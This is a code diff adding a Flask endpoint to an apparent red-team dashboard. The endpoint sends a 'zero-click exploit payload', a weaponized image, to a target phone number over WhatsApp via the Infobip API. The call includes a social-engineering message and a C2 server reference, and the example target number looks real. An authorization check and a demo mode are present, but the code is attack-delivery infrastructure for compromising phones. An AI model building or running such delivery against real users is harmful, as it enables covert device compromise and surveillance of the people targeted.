@@ -22,6 +22,7 @@ from dotenv import load_dotenv
 from modules.mobile_security_testing import MobileSecurityTesting
 from modules.mobile_attack_payloads import MobileAttackPayloads
 from modules.steganography_injector import SteganographyInjector
+from modules.infobip_whatsapp_sender import InfobipWhatsAppSender
 from database.models import SessionLocal, AttackSimulation, AuditLog
 from werkzeug.utils import secure_filename
 
@@ -45,6 +46,7 @@ logger = logging.getLogger(__name__)
 # Initialize modules
 mobile_tester = MobileSecurityTesting()
 attack_payloads = MobileAttackPayloads()
+whatsapp_sender = InfobipWhatsAppSender()
 db_session = SessionLocal()
 
 # Enhanced HTML Template for Red Team Mobile Attack Dashboard
@@ -940,6 +942,86 @@ def generate_stego_payload():
         }), 500
 
 
+@app.route('/api/send_whatsapp_payload', methods=['POST'])
+def send_whatsapp_payload():
+    """
+    Send zero-click exploit payload via WhatsApp using Infobip API
+
+    Request JSON:
+    {
+        "target_phone": "+447575960046",
+        "payload_filename": "weaponized_social_media_image.png",
+        "message": "Optional custom message" (or auto-generated)
+    }
+    """
+    try:
+        data = request.get_json()
+        target_phone = data.get('target_phone', '')
+        payload_filename = data.get('payload_filename', '')
+        custom_message = data.get('message', None)
+
+        if not target_phone or not payload_filename:
+            return jsonify({
+                'success': False,
+                'error': 'target_phone and payload_filename are required'
+            }), 400
+
+        logger.info(f"[WHATSAPP DELIVERY] Request to send payload to {target_phone}")
+        logger.info(f"[WHATSAPP DELIVERY] Payload: {payload_filename}")
+
+        # Check if target is authorized
+        if not mobile_tester.is_target_authorized(target_phone):
+            logger.warning(f"[WHATSAPP DELIVERY] Unauthorized target: {target_phone}")
+            return jsonify({
+                'success': False,
+                'error': 'Target not authorized for attack simulation',
+                'target': target_phone
+            }), 403
+
+        # Send zero-click payload via WhatsApp
+        result = whatsapp_sender.send_zero_click_payload(
+            target_phone=target_phone,
+            payload_filename=payload_filename,
+            social_engineering_message=custom_message,
+            c2_server=attack_payloads.c2_server
+        )
+
+        if result.get('success'):
+            logger.info(f"[WHATSAPP DELIVERY] ✅ Payload delivered to {target_phone}")
+
+            # Log to database
+            try:
+                attack = AttackSimulation(
+                    attack_type='mobile_whatsapp_delivery',
+                    target=target_phone,
+                    status='success',
+                    timestamp=datetime.utcnow(),
+                    details=json.dumps({
+                        'payload': payload_filename,
+                        'delivery_method': 'whatsapp',
+                        'message': custom_message or result.get('media_url', ''),
+                        'demo_mode': result.get('demo_mode', False)
+                    })
+                )
+                db_session.add(attack)
+                db_session.commit()
+            except Exception as e:
+                logger.error(f"Database logging error: {e}")
+                db_session.rollback()
+
+            return jsonify(result), 200
+        else:
+            logger.error(f"[WHATSAPP DELIVERY] ❌ Failed to deliver to {target_phone}")
+            return jsonify(result), 500
+
+    except Exception as e:
+        logger.error(f"Error in send_whatsapp_payload: {e}")
+        return jsonify({
+            'success': False,
+            'error': str(e)
+        }), 500
+
+
 @app.route('/api/health', methods=['GET'])
 def health_check():
     """Health check endpoint"""
@@ -948,7 +1030,8 @@ def health_check():
         'timestamp': datetime.utcnow().isoformat(),
         'demo_mode': attack_payloads.demo_mode,
         'c2_server': attack_payloads.c2_server,
-        'whatsapp_enabled': mobile_tester.infobip_whatsapp_enabled
+        'whatsapp_enabled': mobile_tester.infobip_whatsapp_enabled,
+        'whatsapp_sender': os.getenv('INFOBIP_SENDER_NUMBER', 'not configured')
     })
 
 
